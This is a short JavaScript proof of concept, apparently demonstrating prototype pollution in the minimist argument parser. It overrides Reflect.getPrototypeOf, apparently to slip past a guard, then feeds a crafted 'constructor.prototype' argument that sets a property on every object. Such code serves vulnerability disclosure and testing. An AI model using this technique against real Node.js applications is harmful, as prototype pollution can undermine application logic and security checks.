Reflect.getPrototypeOf = () => false;
console.log({}.polluted);
require('minimist')('constructor.prototype.polluted yes'.split(' '));
console.log({}.polluted);